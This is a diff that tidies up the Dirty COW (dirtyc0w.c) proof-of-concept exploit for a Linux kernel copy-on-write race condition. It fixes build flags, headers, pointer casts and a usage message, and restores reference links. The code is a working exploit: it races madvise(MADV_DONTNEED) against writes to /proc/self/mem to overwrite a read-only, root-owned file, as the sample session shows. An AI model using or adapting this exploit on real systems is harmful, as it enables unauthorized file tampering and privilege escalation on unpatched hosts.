@@ -7,7 +7,7 @@ $ ls -lah foo
 -r-----r-- 1 root root 19 Oct 20 15:23 foo
 $ cat foo
 this is not a test
-$ gcc -lpthread dirtyc0w.c -o dirtyc0w
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
 $ ./dirtyc0w foo m00000000000000000
 mmap 56123000
 madvise 0
@@ -20,13 +20,16 @@ m00000000000000000
 #include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
 #include <string.h>
-  
+#include <stdint.h>
+
 void *map;
 int f;
 struct stat st;
 char *name;
-  
+ 
 void *madviseThread(void *arg)
 {
   char *str;
@@ -35,7 +38,7 @@ void *madviseThread(void *arg)
   for(i=0;i<100000000;i++)
   {
 /*
-You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
+You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
 > This is achieved by racing the madvise(MADV_DONTNEED) system call
 > while having the page of the executable mmapped in memory.
 */
@@ -43,13 +46,13 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06
   }
   printf("madvise %d\n\n",c);
 }
-  
+ 
 void *procselfmemThread(void *arg)
 {
   char *str;
   str=(char*)arg;
 /*
-You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 >  The in the wild exploit we are aware of doesn't work on Red Hat
 >  Enterprise Linux 5 and 6 out of the box because on one side of
 >  the race it writes to /proc/self/mem, but /proc/self/mem is not
@@ -61,19 +64,22 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
 /*
 You have to reset the file pointer to the memory position.
 */
-    lseek(f,map,SEEK_SET);
+    lseek(f,(uintptr_t) map,SEEK_SET);
     c+=write(f,str,strlen(str));
   }
   printf("procselfmem %d\n\n", c);
 }
-  
-  
+ 
+ 
 int main(int argc,char *argv[])
 {
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3)return 1;
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
   pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
@@ -93,7 +99,7 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 You have to open with PROT_READ.
 */
   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
-  printf("mmap %x\n\n",map);
+  printf("mmap %zx\n\n",(uintptr_t) map);
 /*
 You have to do it on two threads.
 */
